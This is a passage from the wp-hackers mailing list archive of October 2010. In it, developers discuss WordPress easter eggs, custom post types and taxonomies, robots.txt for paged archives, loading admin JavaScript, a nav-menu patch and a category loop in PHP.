Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
References: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
	<C8E9D599.64295%chris@clwill.com>
	<AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>
	<AANLkTik5u275zeXXyTL9tSHy2vqkRDKjSo+eBugjFvUa@mail.gmail.com>
	<AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
Message-ID: <AANLkTinHqqSjX3E8=h=N9C_WsxvDhN69LqDjnx0O8ksP@mail.gmail.com>

On Sun, Oct 24, 2010 at 4:24 PM, Eric Mann <eric at eam.me> wrote:
> In actuality, Otto's original suggestion of just hooking in to
> `admin_action_diff` does just about everything I need.

Good. I'm glad somebody was paying attention. Sometimes simple
solutions work. :)

-Otto

From jimmy.roy at gmail.com  Mon Oct 25 02:08:16 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Mon, 25 Oct 2010 10:08:16 +0800
Subject: [wp-hackers] automatic taxonomy update after add a new custom post
	type
In-Reply-To: <AANLkTinF8_pmQo61WWLqSNv7k0QGqCRGTskOkV7g68jY@mail.gmail.com>
References: <AANLkTinF8_pmQo61WWLqSNv7k0QGqCRGTskOkV7g68jY@mail.gmail.com>
Message-ID: <AANLkTikpOsw7KrsphtxD4-Y1RdxgV1gCG73AidHFgMFG@mail.gmail.com>

hi guys,

I work on a new project and in this project I have 3 custom post types:

   - book
   - translator automatically
   - editor

until now everything is easy.

now it's more complicated, a book is edited by an editor and translated by a
translator so when I add a new book I would like to select translator and
editor in a custom taxonomy (taxo-translator and taxo-editor).

these 2 custom taxonomies are filled when I add a new translator (custom
post type) and a new editor (custom post type)... actually it's what I want
to do... but is it possible and how to do that?

an action hook after the creation of the custom post type ? how to get name
and id?

I'm not sure if I can do it easily with WP...

Jimmy

From jaredwilli at gmail.com  Mon Oct 25 02:07:58 2010
From: jaredwilli at gmail.com (Jared Williams)
Date: Sun, 24 Oct 2010 22:07:58 -0400
Subject: [wp-hackers] Showing users post counts for custom post types
Message-ID: <AANLkTikpAPEmjOhJaoRzctUYghQO30TK7opwScszjme1@mail.gmail.com>

On Sun, Oct 24, 2010 at 2:26 PM, <wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>   1. Re: prevent indexing of page 2,3 and so on (Jeremy Visser)
>   2. Re: prevent indexing of page 2,3 and so on (Alex Hempton-Smith)
>   3. wp_get_archives by category and wp.org Ideas (Steve Taylor)
>   4. Re: Showing users post counts for custom post types (scribu)
>   5. Re: Showing users post counts for custom post types (Andrew Nacin)
>   6. Re: prevent indexing of page 2,3 and so on (scribu)
>   7. Re: "The Matrix Has You" easter egg (Chris Williams)
>   8. Re: "The Matrix Has You" easter egg (Ryan Bilesky)
>   9. Re: "The Matrix Has You" easter egg (Chip Bennett)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Sun, 24 Oct 2010 23:56:41 +1100
> From: Jeremy Visser <jeremy at visser.name>
> Subject: Re: [wp-hackers] prevent indexing of page 2,3 and so on
> To: wp-hackers at lists.automattic.com
> Message-ID: <4CC42D09.6070106 at visser.name>
> Content-Type: text/plain; charset=ISO-8859-1
>
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Alex Hempton-Smith said:
> > Just hook into the <head> with wp_head, and use a conditional statement
> in
> > that function:
>
> Call me old-fashioned, but wouldn't adding this line to robots.txt suffice?
>
> Disallow: /page
>
> (Yes, you'll need to hook into do_robotstxt to add that line, but that's
> left as an exercise to the reader.)
>
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.4.10 (GNU/Linux)
>
> iEYEARECAAYFAkzELQkACgkQvs6Qqs8TxBqbbwCfXUzA9FIvT6OlOd7/KJI2un8/
> fZQAoLEXu8pMnEepa/m1xyOtDX0QAOIm
> =SbpT
> -----END PGP SIGNATURE-----
>
>
> ------------------------------
>
> Message: 2
> Date: Sun, 24 Oct 2010 14:59:55 +0200
> From: Alex Hempton-Smith <hempsworth at gmail.com>
> Subject: Re: [wp-hackers] prevent indexing of page 2,3 and so on
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTimPU0nV7Y2iesXy=xVt8JPQGDm_8MmqY-i28RhC at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Wow, I didn't even know that existed. Much cleaner way of doing it!
>
> -- Alex
>
>
> On Sun, Oct 24, 2010 at 2:56 PM, Jeremy Visser <jeremy at visser.name> wrote:
>
> > (Yes, you'll need to hook into do_robotstxt to add that line, but that's
> > left as an exercise to the reader.)
> >
>
>
> ------------------------------
>
> Message: 3
> Date: Sun, 24 Oct 2010 15:29:24 +0100
> From: Steve Taylor <steve at sltaylor.co.uk>
> Subject: [wp-hackers] wp_get_archives by category and wp.org Ideas
> To: wp-hackers <wp-hackers at lists.automattic.com>
> Message-ID:
>        <AANLkTinob0bin7vY0uouHBwE6X8joEWdwoyt_YpmX8P6 at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Hi folks,
>
> I'm trawling through the options for filtering wp_get_archives by
> category as well as year. It's a popular request and there's a number
> of solutions out there.
>
> While?I'm interested in the most recent, elegant solution for this if
> anyone wants to chip in, I'm a little more concerned about this:
>
> http://wordpress.org/extend/ideas/topic/implement-wp_get_archivescategory64
>
> Why is this flagged as "implemented"? I thought for a moment maybe
> just the Codex hadn't been updated, but the 3.0.1 source shows no such
> functionality, and I can't see anything lined up for 3.0.2 or 3.1 on
> Trac. Anyone know what's going on?
>
> cheers,
>
> Steve Taylor
>
>
> ------------------------------
>
> Message: 4
> Date: Sun, 24 Oct 2010 18:59:18 +0300
> From: scribu <mail at scribu.net>
> Subject: Re: [wp-hackers] Showing users post counts for custom post
>        types
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTimY4qv=5Kaop0FghSHPucOKriy7Z4XNrWo0t4nA at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> On Sun, Oct 24, 2010 at 7:25 AM, Jared Williams <jaredwilli at gmail.com
> >wrote:
>
> > Hi,
> >
> > I'm trying to figure out how to hook into the users.php manage page to
> > create custom columns for showing the number of posts users have for my
> > custom post types. I created a trac
> > ticket<http://core.trac.wordpress.org/ticket/15200>for this, but
> > @nacin explained why it's a job more for a plugin to do
> > instead, so I turned here.
> >
> > I have been unable to find a way to manipulate the output of the users
> > table, so I can add custom columns for CPTs post counts for each user.
> And
> > that may have something to do with the question @nacin asked, what would
> > the
> > post count numbers link to. For the current 'post' post count a user has,
> > it
> > links to the post manage page, showing all posts for that user
> > (edit.php?author=ID#).
> >
> > If I were to link it somewhere, it would be to
> > 'edit.php?post_type=TYPE&author=ID' if that were even somehow possible I
> > guess. But I don't even necessarily need to link it to anywhere. I mostly
> > want to just show CPT post counts for each person, having 600 users and a
> > combined total of 300+ posts across 4 custom post types. Admins are only
> > one
> > who can submit 'post' posts, so that column in the users page is useless.
> >
> > Anyone have any tips on hooking into that to do this?
> >
>
> First of all, if you're going to be lazy and reply to a thread to open a
> new
> topic (you should send a clean email instead), at least don't quote the old
> topic in your message.
>
> Secondly, there's no way to alter an existing column at the moment. The
> best
> you can do is register a new column and unset the one you're trying to
> overwrite.
>
> Here's a tutorial I wrote for the posts screen:
> http://scribu.net/wordpress/custom-sortable-columns.html
>
> Just ignore the sortable part and replace 'edit-post' with 'users'.
>
  ----------------------------

>
> Message: 5
> Date: Sun, 24 Oct 2010 12:36:10 -0400
> From: Andrew Nacin <wp at andrewnacin.com>
> Subject: Re: [wp-hackers] Showing users post counts for custom post
>        types
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTinCtXrJ1HfsXoTB4X4Dp1P+9RCF-wcb_S9wQsC5 at mail.gmail.com<AANLkTinCtXrJ1HfsXoTB4X4Dp1P%2B9RCF-wcb_S9wQsC5 at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> On Sun, Oct 24, 2010 at 11:59 AM, scribu <mail at scribu.net> wrote:
>
> > On Sun, Oct 24, 2010 at 7:25 AM, Jared Williams <jaredwilli at gmail.com
> > >wrote:
> >
> > > Hi,
> > >
> > > I'm trying to figure out how to hook into the users.php manage page to
> > > create custom columns for showing the number of posts users have for my
> > > custom post types. I created a trac
> > > ticket<http://core.trac.wordpress.org/ticket/15200>for this, but
> > > @nacin explained why it's a job more for a plugin to do
> > > instead, so I turned here.
> > >
> > > I have been unable to find a way to manipulate the output of the users
> > > table, so I can add custom columns for CPTs post counts for each user.
> > And
> > > that may have something to do with the question @nacin asked, what
> would
> > > the
> > > post count numbers link to. For the current 'post' post count a user
> has,
> > > it
> > > links to the post manage page, showing all posts for that user
> > > (edit.php?author=ID#).
> > >
> > > If I were to link it somewhere, it would be to
> > > 'edit.php?post_type=TYPE&author=ID' if that were even somehow possible
> I
> > > guess. But I don't even necessarily need to link it to anywhere. I
> mostly
> > > want to just show CPT post counts for each person, having 600 users and
> a
> > > combined total of 300+ posts across 4 custom post types. Admins are
> only
> > > one
> > > who can submit 'post' posts, so that column in the users page is
> useless.
> > >
> > > Anyone have any tips on hooking into that to do this?
> > >
> >
> > First of all, if you're going to be lazy and reply to a thread to open a
> > new
> > topic (you should send a clean email instead), at least don't quote the
> old
> > topic in your message.
> >
> > Secondly, there's no way to alter an existing column at the moment. The
> > best
> > you can do is register a new column and unset the one you're trying to
> > overwrite.
> >
> > Here's a tutorial I wrote for the posts screen:
> > http://scribu.net/wordpress/custom-sortable-columns.html
> >
> > Just ignore the sortable part and replace 'edit-post' with 'users'.
>
>
> Of note, that tutorial has some awesome 3.1 bits in it. But the process of
> hooking into manage_users_columns etc is all the same. In 3.1, you'll want
> to look in the list-table(s) files in wp-admin/includes. In 3.0 you'll want
> to look in wp-admin/includes/template.php.
>
> I knew how to create custom columns, but I didn't think the users table
> used the same hook. That was all I needed to know really.

For a full solution on how to link to the
> edit.php?%post_type%&author=%author_id% page from the post counts like the
> 'post's do, here's how it can be done http://goo.gl/ycaq.



> I was hoping it was possible to create a column for each ptype but not a
> big deal.   Thanks for the help though.
>


>
> ------------------------------
>
> Message: 6
> Date: Sun, 24 Oct 2010 19:56:35 +0300
> From: scribu <mail at scribu.net>
> Subject: Re: [wp-hackers] prevent indexing of page 2,3 and so on
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTinikspuK-nNGD-J=7k+aFiS=LV4=qmwNjErNKgm at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> On Sun, Oct 24, 2010 at 3:56 PM, Jeremy Visser <jeremy at visser.name> wrote:
>
> > (Yes, you'll need to hook into do_robotstxt to add that line, but that's
> > left as an exercise to the reader.)
> >
>
> You only need to do that if you can't create the robots.txt file on your
> server.
>
>
> ------------------------------
>
> Message: 7
> Date: Sun, 24 Oct 2010 13:57:06 -0400
> From: Chris Williams <chris at clwill.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: "wp-hackers at lists.automattic.com"
>        <wp-hackers at lists.automattic.com>
> Message-ID: <C8E9C182.6427C%chris at clwill.com<C8E9C182.6427C%25chris at clwill.com>
> >
> Content-Type: text/plain; charset="iso-8859-1"
>
> You miss the major point: if I don't know the egg exists, how am I supposed
> to be prescient enough to install the javascript/plugin?
>
> ________________________________
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> if you manage WP installs
> for someone, you can add the javascript so they won't ever see it.  IMO
> anyone who is able to install and manage WP by there own should have no
> problem with that, it would only cause a problem maybe for some horribly
> non-technical person, like my parents.  In which case there is probably
> someone with some technical ability who runs the site handles upgrades,
> ect.
>
> Plus the javascript can be added in via a plugin so really if someone
> writes
> the plugin its a simple as installing a plugin.
>
>
> ------------------------------
>
> Message: 8
> Date: Sun, 24 Oct 2010 11:03:55 -0700
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTinEN50Vf7tM1LoiiX5AVKkrzgpFfvT45tgAhNgH at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Well what then do you purpose because its not like its going to get turned
> off.
>
> On Sun, Oct 24, 2010 at 10:57 AM, Chris Williams <chris at clwill.com> wrote:
>
> > You miss the major point: if I don't know the egg exists, how am I
> supposed
> > to be prescient enough to install the javascript/plugin?
> >
> > ________________________________
> > From: Ryan Bilesky <rbilesky at gmail.com>
> > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >
> > if you manage WP installs
> > for someone, you can add the javascript so they won't ever see it.  IMO
> > anyone who is able to install and manage WP by there own should have no
> > problem with that, it would only cause a problem maybe for some horribly
> > non-technical person, like my parents.  In which case there is probably
> > someone with some technical ability who runs the site handles upgrades,
> > ect.
> >
> > Plus the javascript can be added in via a plugin so really if someone
> > writes
> > the plugin its a simple as installing a plugin.
> >  _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 9
> Date: Sun, 24 Oct 2010 13:26:30 -0500
> From: Chip Bennett <chip at chipbennett.net>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTikLZeD-1sxVLoLHTV5AmTVSfKumWYL=id3y_PtW at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Hmm... it would appear that several things have been proposed - the most
> straight-forward being the so-called "lame" approach of providing a simple
> wp-config.php variable to disable all easter eggs.
>
> In any case, I find it rather disingenuous - or at least, strange - for
> anyone who has followed this particular thread to ask, at this point, "what
> do you propose?".
>
> Chip
>
> On Sun, Oct 24, 2010 at 1:03 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > Well what then do you purpose because its not like its going to get
> turned
> > off.
> >
> > On Sun, Oct 24, 2010 at 10:57 AM, Chris Williams <chris at clwill.com>
> wrote:
> >
> > > You miss the major point: if I don't know the egg exists, how am I
> > supposed
> > > to be prescient enough to install the javascript/plugin?
> > >
> > > ________________________________
> > > From: Ryan Bilesky <rbilesky at gmail.com>
> > > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> > >
> > > if you manage WP installs
> > > for someone, you can add the javascript so they won't ever see it.  IMO
> > > anyone who is able to install and manage WP by there own should have no
> > > problem with that, it would only cause a problem maybe for some
> horribly
> > > non-technical person, like my parents.  In which case there is probably
> > > someone with some technical ability who runs the site handles upgrades,
> > > ect.
> > >
> > > Plus the javascript can be added in via a plugin so really if someone
> > > writes
> > > the plugin its a simple as installing a plugin.
> > >  _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 69, Issue 51
> ******************************************
>



-- 

Jared Williams
*Web Developer / Designer*
*WPHonors.com <http://2010.wphonors.com> - 2010 WPHonors
*New2WP.com <http://new2wp.com> - Development
Tweeaks.com - Design/Tech

From mail at scribu.net  Mon Oct 25 03:31:45 2010
From: mail at scribu.net (scribu)
Date: Mon, 25 Oct 2010 06:31:45 +0300
Subject: [wp-hackers] automatic taxonomy update after add a new custom
 post type
In-Reply-To: <AANLkTikpOsw7KrsphtxD4-Y1RdxgV1gCG73AidHFgMFG@mail.gmail.com>
References: <AANLkTinF8_pmQo61WWLqSNv7k0QGqCRGTskOkV7g68jY@mail.gmail.com>
	<AANLkTikpOsw7KrsphtxD4-Y1RdxgV1gCG73AidHFgMFG@mail.gmail.com>
Message-ID: <AANLkTinM68=B28d9Emmvn8+6ZkiiQzxfin1+q21xus9C@mail.gmail.com>

On Mon, Oct 25, 2010 at 5:08 AM, Jimmy Roy <jimmy.roy at gmail.com> wrote:

> hi guys,
>
> I work on a new project and in this project I have 3 custom post types:
>
>   - book
>   - translator automatically
>   - editor
>
> until now everything is easy.
>
> now it's more complicated, a book is edited by an editor and translated by
> a
> translator so when I add a new book I would like to select translator and
> editor in a custom taxonomy (taxo-translator and taxo-editor).
>
> these 2 custom taxonomies are filled when I add a new translator (custom
> post type) and a new editor (custom post type)... actually it's what I want
> to do... but is it possible and how to do that?
>
> an action hook after the creation of the custom post type ? how to get name
> and id?
>
> I'm not sure if I can do it easily with WP...
>

I think you should try the Posts 2 Posts plugin, instead of trying to map a
post to a taxonomy term:

http://wordpress.org/extend/plugins/posts-to-posts/

From 24-7 at gmx.net  Mon Oct 25 10:24:52 2010
From: 24-7 at gmx.net (24/7)
Date: Mon, 25 Oct 2010 03:24:52 -0700 (PDT)
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinHqqSjX3E8=h=N9C_WsxvDhN69LqDjnx0O8ksP@mail.gmail.com>
References: <AANLkTinD534u7-Q_v07rO3jVmFZix9K9ryOE+-wB4eCu@mail.gmail.com>
	<C8E9D599.64295%chris@clwill.com>
	<AANLkTi=XR=7wDpO0zzvNymbOGT=1bVExkU3YXLaisuq-@mail.gmail.com>
	<AANLkTik5u275zeXXyTL9tSHy2vqkRDKjSo+eBugjFvUa@mail.gmail.com>
	<AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
	<AANLkTinHqqSjX3E8=h=N9C_WsxvDhN69LqDjnx0O8ksP@mail.gmail.com>
Message-ID: <c2fa22f7-f1b6-45bd-9b54-ebd043402e6a@u10g2000yqk.googlegroups.com>

I followed this discussion over the previous days and I maybe have a
solution for the easter egg "feature", capital_P_dangit and else, that
will (again: maybe) satisfy both sides: people with clients/non-tech-
savy people who just run a blog and core devs who love to play with
code and hidden features.

There's a "hidden" page, that not too many people are aware of:
http://example.com/wp-admin/options.php?option_group_id=all

If this would be the place for all that options that got discussed
with a lot of emotion over the last days, weeks & month, then people
would only be aware of one hidden "treasure" page. People would still
explore/see the "depth" of wordpress, but could handle this without
having to know how to code (and bringing both sides on one table
always was one of the most priority goals of WordPress).

Just my 2 cent.

Ps. I myself would prefer to have easter eggs like for example Google:
nintendo like keyboard commands (Up, Down, Up, Up, Left, Right, A, B,
Up, A). People are more familiar with stuff like that and feels more
like game and therefore fun.

From steve at sltaylor.co.uk  Mon Oct 25 11:45:06 2010
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Mon, 25 Oct 2010 12:45:06 +0100
Subject: [wp-hackers] strange problem including external JS file in WP admin
Message-ID: <AANLkTinP5Yoxfv2Poboq49gqW_He51pN+udPgs4xyQr=@mail.gmail.com>

Hi there,

I've just been addressing an issue on a client site, they were having
strange problems with media uploading. I didn't do extensive browser
testing, but the symptoms always appeared in Firefox, and never (for
me) in Chrome (although my client said they occasionally got the
problems in Chrome, too).

The main symptom is that when you click to "Set featured image" while
editing a post, the media pop-up lacked the tabs at the top. You could
upload an image, but when you click "Use as featured image", it
changed to "Saving..." and stuck there - it never saved.

I've also noticed things such as, the left nav in admin not
remembering its state (folded out or in), and the "Publish" controls
on the post edit screen always being open (i.e. as if you've clicked
"Edit" next to Status, Visibility, etc.)

I've spent a while debugging, and tracked it down to some code in my
custom theme that includes JS in the admin header.

Now obviously I assumed it was something to do with my jQuery in the
JS file being included. But it seems to be purely the fact of included
an external JS file. I've narrowed it down quite specifically by
installing a fresh 3.0.1, and adding the following code to the top of
the default theme's functions.php:

function customAdmin() { ?>
	<script type="text/javascript" src="<?php bloginfo(
'template_directory' ); ?>/js-wp.js" />
<?php }
add_action( 'admin_head', 'customAdmin' );

It doesn't appear to matter whether js-wp.js exists, or what is in it
if it does. And, according to my testing, whatever JS you want to
include will work fine (with none of the above side-effects) if you
just include it inline in the header code. It seems that all the above
problems are triggered by the mere inclusion by a theme of a script
tag with the src attribute in the admin header.

Can anyone else confirm this? Any ideas about why it's happening?

cheers,

Steve Taylor

From steve at sltaylor.co.uk  Mon Oct 25 11:53:35 2010
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Mon, 25 Oct 2010 12:53:35 +0100
Subject: [wp-hackers] strange problem including external JS file in WP
	admin
In-Reply-To: <AANLkTinP5Yoxfv2Poboq49gqW_He51pN+udPgs4xyQr=@mail.gmail.com>
References: <AANLkTinP5Yoxfv2Poboq49gqW_He51pN+udPgs4xyQr=@mail.gmail.com>
Message-ID: <AANLkTimwpwNK-EvjPtbydBxqKZNrb_L=9c-tYgh2fOTJ@mail.gmail.com>

OK, I'm wising up:

http://planetozh.com/blog/2008/04/how-to-load-javascript-with-your-wordpress-plugin/

Assume this applies to themes, too, and that this is my problem in a
nutshell... D'oh.

Steve

From jeremy at visser.name  Mon Oct 25 13:26:21 2010
From: jeremy at visser.name (Jeremy Visser)
Date: Tue, 26 Oct 2010 00:26:21 +1100
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTinikspuK-nNGD-J=7k+aFiS=LV4=qmwNjErNKgm@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>	<4CC42D09.6070106@visser.name>
	<AANLkTinikspuK-nNGD-J=7k+aFiS=LV4=qmwNjErNKgm@mail.gmail.com>
Message-ID: <4CC5857D.7060008@visser.name>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

scribu said:
> On Sun, Oct 24, 2010 at 3:56 PM, Jeremy Visser <jeremy at visser.name> wrote:
>> (Yes, you'll need to hook into do_robotstxt to add that line, but that's
>> left as an exercise to the reader.)
> 
> You only need to do that if you can't create the robots.txt file on your
> server.

That's right.

I didn't mention that because the robots.txt generated by WordPress
differs based on the privacy setting you have chosen (and brevity is the
soul of...well, you get the idea). If that's not an issue, by all means
go ahead.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)

iEYEARECAAYFAkzFhX0ACgkQvs6Qqs8TxBrh2QCfRkAQhm26c0uT5QZuERmmPL0K
pbwAn2qgAXgU2aT7IM4sxRken9CudI32
=SAWp
-----END PGP SIGNATURE-----

From emoya at tribune.com  Mon Oct 25 15:42:27 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Mon, 25 Oct 2010 10:42:27 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikd-fqgY1hUcqZ=8TJEA87ZF3HbwaQOo-RtkKmS@mail.gmail.com>
Message-ID: <C8EB0F93.D0A9%emoya@tribune.com>

On 10/24/10 4:24 PM, "Eric Mann" <eric at eam.me> wrote:

For the sake of argument, why don't we come up with a list of these
"additional" features that developers might need to turn off for clients,
bundle the code into a drop-in (as opposed to a plug-in), and allow
         developers who need it to just deploy it on their sites?

+1

I just added your code to a plugin I had already written to remove the capital_P_dangit egg. I renamed the plugin "Disable All Easter Eggs". That said, I don't know of any other relevant  easter eggs than the two I just mentioned. A quick google search did not turn up any more eggs that seem to be up-to-date.

If anyone knows of ANY others than the two I just mentioned, please bring it up here so we can figure out a way to turn them off via a plugin.

There needs to be a simple way for people who don't know what a hook is, how to write javascript, can turn these off. Maybe if I care enough, at some point it could have a little interface so you can chose which ones to turn on or off - but for now, they will all get turned off. But if I don't get any feedback, 'All' will constitute just these two.

This is the very least we can do, and possibly the only thing that can be done.


--
Eddie Moya
Applications Developer
Tribune Technology




From gaarai at gaarai.com  Mon Oct 25 21:01:52 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 25 Oct 2010 16:01:52 -0500
Subject: [wp-hackers] Patch proposal for adding a class to menus with
	sub-menus
Message-ID: <4CC5F040.3090008@gaarai.com>

I just added a new ticket and patch to trac: 
http://core.trac.wordpress.org/ticket/15214

Since CSS doesn't offer a parent selector and sibling selectors only go 
forward when matching, it isn't possible to style a navigation menu item 
that has a sub-menu (drop-down menu) without writing a custom Walker 
class. So, I made a simple patch that adds support for this to both the 
wp_nav_menu and wp_list_pages functions.

If you are interested, please check out the ticket, look at the patch 
(it's a quick 6-liner), and comment on it.

-- 
Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


From fidler.brian at gmail.com  Tue Oct 26 00:37:41 2010
From: fidler.brian at gmail.com (Brian Fidler)
Date: Mon, 25 Oct 2010 17:37:41 -0700
Subject: [wp-hackers] Looping through categories
Message-ID: <AANLkTi=SziiczkZ=fnWkNF3YK5a=Q5z43F36huXsjCVg@mail.gmail.com>

I need to loop through my categories however I need to limit the categories
to those categories that include posts where the custom field of price != 0
or null.

What is the best way to handle this?

Currently I've got this...

<div id="page-categories" style="margin-top:-34px;">

<!-- PRINT CATEGORY LISTINGS -->
<?php

$categories=get_categories();
foreach($categories as $category) {

?>

<?php
$myColumnCount = 1;
?>

<h2 style="clear:both;"><a href="<?php bloginfo('url'); ?>/category/<?php
echo($category->slug); ?>"><?php echo($category->name); ?></a></h2>

<?php
query_posts('cat='.$category->cat_ID.'&posts_per_page=-1&orderby=title&order=ASC');
?>
<?php if (have_posts()) : while (have_posts()) : the_post(); ?>

<!-- YOUR POST DISPLAYING CODE GOES HERE -->

<div id="" class="span-1 <?php if ($myColumnCount==6) { echo "last"; } ?>
thumb20" >
<a class="thumb" href="<?php the_permalink(); ?>" rel="bookmark" title="Link
to <?php the_title(); ?>" >
<?php echo the_post_thumbnail( 'thumbnail' ); ?>
</a>
</div>
<!-- YOUR POST DISPLAYING CODE GOES HERE -->

<?php if ($myColumnCount == 6) {
$myColumnCount=0;
} ?>

<?php $myColumnCount = $myColumnCount+1; ?>

<?php
 endwhile;
endif;
echo '<hr class="gallery-grid" />';
?>
<?php } ?>

<?php $wp_query = $temp_query; ?>
</div>

 [image: brian fidler interactive] <http://www.brianfidler.com>
[image: Follow brianfidler on twitter] <http://www.twitter.com/brianfidler>
 [image: View Brian Fidler's profile on
LinkedIn]<http://www.linkedin.com/in/brianfidler>
 [image: Join brian fidler interactive on
facebook]<http://www.facebook.com/BrianFidlerInteractive>
 email: interactive at brianfidler.com
phone: 602.758.4733

From rbilesky at gmail.com  Tue Oct 26 04:29:57 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Mon, 25 Oct 2010 21:29:57 -0700
Subject: [wp-hackers] Looping through categories
In-Reply-To: <AANLkTi=SziiczkZ=fnWkNF3YK5a=Q5z43F36huXsjCVg@mail.gmail.com>
References: <AANLkTi=SziiczkZ=fnWkNF3YK5a=Q5z43F36huXsjCVg@mail.gmail.com>
Message-ID: <AANLkTimz+k0aVCgHARh6FMd7zr=PES8mzdzYk1hHtKwc@mail.gmail.com>

Well not sure if this absolutely the best way to do this but what I would do
is this

have a for each loop to go though categories, inside that set a Boolean to
false then do a for each with the posts that are in that category, check the
meta data and if it matches what you need set the Boolean true and exit that
loop then you can build add to the output if the Boolean is set to true.

On Mon, Oct 25, 2010 at 5:37 PM, Brian Fidler <fidler.brian at gmail.com>wrote:

> I need to loop through my categories however I need to limit the categories
> to those categories that include posts where the custom field of price != 0
> or null.
>
> What is the best way to handle this?
>
> Currently I've got this...
>
> <div id="page-categories" style="margin-top:-34px;">
>
> <!-- PRINT CATEGORY LISTINGS -->
> <?php
>
> $categories=get_categories();
> foreach($categories as $category) {
>
> ?>
>
> <?php
> $myColumnCount = 1;
> ?>
>
> <h2 style="clear:both;"><a href="<?php bloginfo('url'); ?>/category/<?php
> echo($category->slug); ?>"><?php echo($category->name); ?></a></h2>
>
> <?php
>
> query_posts('cat='.$category->cat_ID.'&posts_per_page=-1&orderby=title&order=ASC');
> ?>
> <?php if (have_posts()) : while (have_posts()) : the_post(); ?>
>
> <!-- YOUR POST DISPLAYING CODE GOES HERE -->
>
> <div id="" class="span-1 <?php if ($myColumnCount==6) { echo "last"; } ?>
> thumb20" >
> <a class="thumb" href="<?php the_permalink(); ?>" rel="bookmark"
> title="Link
> to <?php the_title(); ?>" >
> <?php echo the_post_thumbnail( 'thumbnail' ); ?>
> </a>
> </div>
> <!-- YOUR POST DISPLAYING CODE GOES HERE -->
>
> <?php if ($myColumnCount == 6) {
> $myColumnCount=0;
> } ?>
>
> <?php $myColumnCount = $myColumnCount+1; ?>
>
> <?php
>  endwhile;
> endif;
> echo '<hr class="gallery-grid" />';
> ?>
> <?php } ?>
>
> <?php $wp_query = $temp_query; ?>
> </div>
>
>  [image: brian fidler interactive] <http://www.brianfidler.com>
> [image: Follow brianfidler on twitter] <http://www.twitter.com/brianfidler
> >
>  [image: View Brian Fidler's profile on
> LinkedIn]<http://www.linkedin.com/in/brianfidler>
>  [image: Join brian fidler interactive on
> facebook]<http://www.facebook.com/BrianFidlerInteractive>
>  email: interactive at brianfidler.com
> phone: 602.758.4733
> _______________________________________________
> wp-hackers mailing list
